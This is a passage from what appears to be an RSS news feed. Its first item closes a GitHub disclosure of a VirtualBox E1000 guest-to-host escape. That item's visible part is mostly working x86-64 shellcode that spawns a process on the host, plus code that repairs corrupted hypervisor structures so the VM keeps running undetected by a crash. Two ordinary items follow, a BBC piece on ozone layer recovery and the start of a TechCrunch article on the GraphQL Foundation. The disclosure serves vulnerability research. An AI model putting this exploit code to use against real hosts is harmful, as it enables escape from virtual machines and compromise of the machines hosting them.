&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x800&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;rep&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;movsb&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;nop&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;payload:&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; Here the shellcode is to be&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;loader_size = $ &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; start&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The shellcode is executed. Its first part is:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-assembly&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;use64&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;start:&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; sys_fork&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;58&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;syscall&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;jnz&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; continue_process_execution&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Initialize argv&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Initialize envp&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; sys_execve&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;59&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;syscall&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;cmd     db &lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;'/usr/bin/xterm'&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;env     db &lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;'DISPLAY=:0.0'&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;argv    dq &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;envp    dq &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It does fork and execve to create /usr/bin/xterm process. The attacker gains control over the host's ring 3.&lt;/p&gt;
&lt;h3&gt;Process Continuation&lt;/h3&gt;
&lt;p&gt;I believe every exploit should be finished. It means it should not crash an application, though it's not always possible, of course. We need the virtual machine to continue execution which is achieved by the second part of shellcode.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-assembly&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;continue_process_execution:&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; Restore RBP&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x48&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Skip junk&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x10&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Restore the registers that must be preserved according to System V ABI&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbx&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r12&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r13&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r14&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r15&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Skip junk&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x8&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Fix the linked list of PDMQUEUE to prevent segfaults on VM shutdown&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; Before:   &quot;E1000-Xmit&quot; -&amp;gt; &quot;E1000-Rcv&quot; -&amp;gt; &quot;Mouse_1&quot; -&amp;gt; NULL&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; After:    &quot;E1000-Xmit&quot; -&amp;gt; NULL&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Zero out the entire PDMQUEUE &quot;Mouse_1&quot; pointed by &quot;E1000-Rcv&quot;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; This was unnecessary on my testing machines but to be sure...&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0xA0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;rep&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;stosb&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; NULL out a pointer to PDMQUEUE &quot;E1000-Rcv&quot; stored in &quot;E1000-Xmit&quot;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; because the first 8 bytes of &quot;E1000-Rcv&quot; (a pointer to &quot;Mouse_1&quot;) &lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; will be corrupted in MMHyperFree&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; qword &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x0&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Now the last PDMQUEUE is &quot;E1000-Xmit&quot; which will not be corrupted&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When e1kHandleRxPacket is called a callstack is:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#0 e1kHandleRxPacket
#1 e1kTransmitFrame
#2 e1kXmitDesc
#3 e1kXmitPacket
#4 e1kXmitPending
#5 e1kR3NetworkDown_XmitPending
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We'll jump right to e1kR3NetworkDown_XmitPending which does nothing more and returns to a hypervisor function.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;DECLCALLBACK&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;) e1kR3NetworkDown_XmitPending(PPDMINETWORKDOWN pInterface)
{
    PE1KSTATE pThis = &lt;span class=&quot;pl-c1&quot;&gt;RT_FROM_MEMBER&lt;/span&gt;(pInterface, E1KSTATE, INetworkDown);
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt; Resume suspended transmission &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
    STATUS &amp;amp;= ~STATUS_TXOFF;
    &lt;span class=&quot;pl-c1&quot;&gt;e1kXmitPending&lt;/span&gt;(pThis, &lt;span class=&quot;pl-c1&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;fOnWorkerThread&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The shellcode adds 0x48 to RBP to make it as it should be in e1kR3NetworkDown_XmitPending. Next, the registers RBX, R12, R13, R14, R15 are taken from stack because it's required by System V ABI to preserve it in a callee function. If they aren't the hypervisor will crash because of invalid pointers in them.&lt;/p&gt;
&lt;p&gt;It could be enough because the virtual machine isn't crashes anymore and continues execute. But there will an access violation in PDMR3QueueDestroyDevice function when the VM is shutdown. The reason is that when the heap is overflowed an important structure PDMQUEUE is overwritten. Furthermore, it's overwritten by the last two ROP gadgets i.e. the last 16 bytes. I tried to reduce the ROP chain size and failed, but when I replaced the data manually the hypervisor was still crashing. It meant the obstacle is not as obvious as seemed.&lt;/p&gt;
&lt;p&gt;Data structure being overwritten is a linked list. Data to be overwritten is in the last second list element; a next pointer is to be overwritten. The remedy turned out to be simple:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;; Fix the linked list of PDMQUEUE to prevent segfaults on VM shutdown
; Before:   &quot;E1000-Xmit&quot; -&amp;gt; &quot;E1000-Rcv&quot; -&amp;gt; &quot;Mouse_1&quot; -&amp;gt; NULL
; After:    &quot;E1000-Xmit&quot; -&amp;gt; NULL
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Getting rid of the last two elements allows the virtual machine to shut down smoothly.&lt;/p&gt;
&lt;h2&gt;Demo&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://vimeo.com/299325088&quot; rel=&quot;nofollow&quot;&gt;https://vimeo.com/299325088&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;
</description>
<pubDate>Tue, 06 Nov 2018 23:36:55 +0000</pubDate>
<dc:creator>kpcyrd</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/44814771?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>MorteNoir1/virtualbox_e1000_0day</og:title>
<og:url>https://github.com/MorteNoir1/virtualbox_e1000_0day</og:url>
<og:description>VirtualBox E1000 Guest-to-Host Escape. Contribute to MorteNoir1/virtualbox_e1000_0day development by creating an account on GitHub.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/MorteNoir1/virtualbox_e1000_0day</dc:identifier>
</item>
<item>
<title>Ozone: The Earth&amp;#039;s protective shield is repairing</title>
<link>https://www.bbc.com/news/newsbeat-46107843</link>
<guid isPermaLink="true" >https://www.bbc.com/news/newsbeat-46107843</guid>
<description>&lt;figure class=&quot;media-landscape has-caption full-width lead&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                &lt;img class=&quot;js-image-replace&quot; alt=&quot;Ozone&quot; src=&quot;https://ichef.bbci.co.uk/news/320/cpsprodpb/9EDF/production/_102417604_e1000208-ozone_hole_2000-spl.jpg&quot; width=&quot;976&quot; height=&quot;900&quot;/&gt;&lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;NASA/SCIENCE PHOTO LIBRARY&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    The ozone hole over Antarctica in the year 2000
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;The ozone layer, which protects us from ultraviolet light, looks to be successfully healing after gaping holes were discovered in the 1980s.&lt;/p&gt;&lt;p&gt;The Northern Hemisphere could be fully fixed by the 2030s and Antarctica by the 2060s. &lt;/p&gt;&lt;p&gt;A new &lt;a href=&quot;https://news.un.org/en/story/2018/11/1024842&quot; class=&quot;story-body__link-external&quot;&gt;United Nations report&lt;/a&gt; says it's an example of what global agreements can achieve. &lt;/p&gt;&lt;p&gt;The ozone layer had been damaged by man-made chemicals called chlorofluorocarbons (CFCs). &lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;Antartica &lt;/span&gt;
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;What does the ozone layer do?&lt;/h2&gt;&lt;p&gt;The ozone layer starts about six miles above Earth. &lt;/p&gt;&lt;p&gt;It is a colourless form of a specific type of oxygen molecule that protects Earth from ultraviolet rays that can cause skin cancer, eye problems and crop damage. &lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;How was it being damaged by humans?&lt;/h2&gt;&lt;p&gt;The chlorofluorocarbons (CFCs) effectively began eating away at the ozone.&lt;/p&gt;&lt;p&gt;CFCs were found in things like spray cans, fridges, foam insulation and air conditioners. &lt;/p&gt;&lt;p&gt;As a result, in 1985 a gaping hole in the ozone over the South Pole was discovered. &lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;How bad did it get?&lt;/h2&gt;&lt;p&gt;At its worst in the late 1990s, about 10% of the upper ozone layer was depleted.&lt;/p&gt;&lt;p&gt;But since 2000, it has begun to increase again by about 3% per decade, according to the UN report.&lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;How did things turn around? &lt;/h2&gt;&lt;p&gt;An international agreement called the Montreal Protocol made sure that businesses came up with replacements for these damaging products. 180 countries signed up to it. &lt;/p&gt;&lt;p&gt;In signing the protocol, those countries agreed to phase out chemicals like CFCs.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;Getty Images&lt;/span&gt;
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;So it's all better now?&lt;/h2&gt;&lt;p&gt;No. &lt;/p&gt;&lt;p&gt;It's not a complete success yet, according to the University of Colorado's Brian Toon, who was not part of the report.&lt;/p&gt;&lt;p&gt;&quot;We are only at a point where recovery may have started,&quot; he said, pointing to some areas of the ozone that haven't repaired. &lt;/p&gt;&lt;p&gt;There are also concerns that increasing emissions of some chlorine-containing chemicals could still slow down the progress made in healing the ozone layer.&lt;/p&gt;&lt;p&gt;These are normally made in China to go in to paint stripping products and to create PVC and they are unregulated. &lt;/p&gt;&lt;p&gt;But many experts are seeing it as a major step forward. &lt;/p&gt;&lt;p&gt;&quot;It's really good news,&quot; said report co-chairman Paul Newman, chief Earth scientist at Nasa's Goddard Space Flight Centre.&lt;/p&gt;&lt;p&gt;&quot;If ozone-depleting substances had continued to increase, we would have seen huge effects. We stopped that.&quot;&lt;/p&gt;&lt;p&gt;&lt;i&gt;Follow Newsbeat on &lt;/i&gt;&lt;a href=&quot;https://www.instagram.com/bbcnewsbeat/&quot; class=&quot;story-body__link-external&quot;&gt;Instagram&lt;/a&gt;&lt;i&gt;, &lt;/i&gt;&lt;a href=&quot;https://www.facebook.com/bbcnewsbeat/&quot; class=&quot;story-body__link-external&quot;&gt;Facebook&lt;/a&gt;&lt;i&gt; and &lt;/i&gt;&lt;a href=&quot;https://twitter.com/BBCNewsbeat&quot; class=&quot;story-body__link-external&quot;&gt;Twitter&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;&lt;i&gt;Listen to Newsbeat &lt;/i&gt;&lt;a href=&quot;http://www.bbc.co.uk/radio/player/bbc_radio_one&quot; class=&quot;story-body__link&quot;&gt;live&lt;/a&gt;&lt;i&gt; at 12:45 and 17:45 every weekday on BBC Radio 1 and 1Xtra - if you miss us you can listen back &lt;/i&gt;&lt;a href=&quot;http://www.bbc.co.uk/programmes/b006wkry/episodes/player&quot; class=&quot;story-body__link&quot;&gt;here&lt;/a&gt;. &lt;/p&gt;
            </description>
<pubDate>Tue, 06 Nov 2018 21:39:29 +0000</pubDate>
<dc:creator>pseudolus</dc:creator>
<og:title>Ozone: The Earth's protective shield is repairing</og:title>
<og:type>article</og:type>
<og:description>The ozone layer is finally healing from damage humans have caused, according to the United Nations.</og:description>
<og:url>https://www.bbc.com/news/newsbeat-46107843</og:url>
<og:image>https://ichef.bbci.co.uk/news/1024/branded_news/9EDF/production/_102417604_e1000208-ozone_hole_2000-spl.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bbc.com/news/newsbeat-46107843</dc:identifier>
</item>
<item>
<title>Facebook’s GraphQL gets its own open-source foundation</title>
<link>https://techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</link>
<guid isPermaLink="true" >https://techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</guid>
<description>&lt;p id=&quot;speakable-summary&quot;&gt;GraphQL, the &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/facebook&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;facebook&quot;&gt;Facebook&lt;/a&gt;-incubated data query language, is moving into its own open-source foundation. Like so many other similar open-source foundations, the aptly named &lt;a href=&quot;https://gql.foundation/&quot;&gt;GraphQL Foundation&lt;/a&gt; will be hosted by the &lt;a href=&quot;https://www.linuxfoundation.org/&quot;&gt;Linux Foundation&lt;/a&gt;.&lt;/p&gt;
